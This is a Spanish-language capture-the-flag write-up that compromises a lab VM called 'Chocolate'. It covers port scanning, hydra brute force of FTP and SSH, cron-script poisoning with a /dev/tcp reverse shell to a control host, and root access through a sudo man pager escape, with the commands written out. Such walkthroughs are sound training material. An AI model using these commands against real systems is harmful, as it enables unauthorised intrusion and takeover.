# Writeup: Operation Chocolate 🍫

Análisis táctico y cadena de explotación de la máquina objetivo **Chocolate** (IP: `192.168.0.8`). El vector de ataque involucra la enumeración de directorios web, el secuestro de una tarea programada (Cron Job) mediante inyección de código en un script Bash en un servidor FTP, movimiento lateral y escalada de privilegios a través del binario ejecutable `man` [GTFOBins alternative path].

---

## 🎯 Target Overview
* **Target IP:** `192.168.0.8`
* **OS:** Linux (Debian GNU/Linux 12 - Bookworm)
* **Architecture:** x86_64
* **Infrastructure:** Oracle VirtualBox hypervisor (`08:00:27:69:B9:7A`)

---

## ⚡ Phase 01: Reconnaissance & Port Scanning

Ejecución de un escaneo SYN Stealth sobre el rango total de puertos TCP (`-p-`) con evasión de descubrimiento de host activa (`-Pn`).

```bash
# Reconnaissance phase over all TCP ports
sudo nmap -Pn -sS -p- --min-rate 5000 192.168.0.8
```

### Open Ports Output
* **21/tcp** - `FTP` - vsFTPd 3.0.3
* **22/tcp** - `SSH` - OpenSSH 9.2p1 Debian 2+deb12u2
* **80/tcp** - `HTTP` - Apache httpd 2.4.59

### Deep Service Enumeration
```bash
nmap -sCV -p 21,22,80 192.168.0.8
```

---

## 🔍 Phase 02: Web Enumeration & FTP Intrusion

### Directory Fuzzing
El escaneo con herramientas de descubrimiento de directorios (`gobuster`) reveló un endpoint no indexado en la raíz del servidor web:
* **Target Directory:** `http://192.168.0.8/web/`
* **Leaked Asset:** Identificación del usuario legítimo del sistema: `bob`.

### FTP Weaponization
Se procedió a realizar un ataque de fuerza bruta dirigido contra el servicio FTP aprovechando la fuga del nombre de usuario:
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 64 -s 21 ftp://192.168.0.8 -I
```
* **Credentials Found:** `bob` : `chocolate`

Al ingresar al servidor FTP, se identificó un archivo con permisos de lectura/escritura (`-rw-r--r--`) que parecía ejecutarse periódicamente en el sistema (`Cron Job`), además de la flag `user.txt` (restringida para root en ese entorno FTP):
```log
-rw-r--r--    1 1001     1001          352 May 16  2024 limpieza.sh
-r--------    1 0        0              33 May 16  2024 user.txt
```

### Script Poisoning (Arbitrary Code Execution)
Se descargó el script `limpieza.sh` y se modificó su estructura interna agregando un payload para forzar una Reverse Shell interactiva hacia la estación de control (`192.168.0.5:443`):

```bash
# Inyección de payload reverso limpieza.sh
#!/bin/bash  #KALETH
bash -c "bash -i >& /dev/tcp/192.168.0.5/443 0>&1"
```

El script envenenado se subió nuevamente al servidor FTP sustituyendo al original. Tras la ejecución automática del Cron Job en el sistema objetivo, se obtuvo acceso inicial a la máquina.

---

## 🏃 Phase 03: Lateral Movement (From bob to secretote)

Una vez dentro de la terminal, se realizó una lectura del archivo de cuentas del sistema `/etc/passwd`, revelando un usuario de alto interés con un vector SSH activo:
```log
secretote:x:1002:1002:secretote,,,:/home/secretote:/bin/bash
```

Se ejecutó un ataque de fuerza bruta secundario por SSH dirigido a este usuario para pivotar verticalmente:
```bash
hydra -l secretote -P /usr/share/wordlists/rockyou.txt -t 64 -s 22 ssh://192.168.0.8 -I
```
* **Lateral Vector Credentials:** `secretote` : `chocolate1`

---

## 🚀 Phase 04: Privilege Escalation (From secretote to Root)

### Local Sudoers Audit
Tras autenticarse exitosamente vía SSH como `secretote`, se listaron sus capacidades de ejecución con privilegios:
```bash
secretote@chocolate:~\$ sudo -l
```
```log
User secretote may run the following commands on chocolate:
    (ALL : ALL) /usr/bin/man
```

El usuario posee permisos para ejecutar el paginador de manuales del sistema (`/usr/bin/man`) bajo el contexto de cualquier usuario, incluido `root`, sin restricciones.

### Exploitation Weapon: Pager Escape Breakout
El binario `man` utiliza por defecto paginadores del sistema como `less` para mostrar la información. Cuando el texto excede la pantalla o se invoca de manera interactiva, permite la ejecución de comandos del sistema operativo anteponiendo el carácter `!`.

#### Execution Steps:
1. Invocar el visor de manuales utilizando privilegios de administración:
   ```bash
   sudo /usr/bin/man man
   ```
   luego ejecutamos el caracter ! IMPORTANTE
2. Una vez abierto el prompt interactivo del manual, escribir directamente la instrucción de escape para romper el entorno del paginador y spawnear una shell de root:
   ```text
   !sh
   ```

---

## 🏴 Phase 05: Post-Exploitation & Loot

El escape del paginador rompe el entorno restringido otorgando acceso inmediato a una terminal con el UID del superusuario:

```bash
root@chocolate:/home/secretote# whoami
root

root@chocolate:/home/secretote# cd /root
root@chocolate:~# cat root.txt
[REDACTED_ROOT_FLAG]
```

**Operation Completed. System Compromised.** 💀
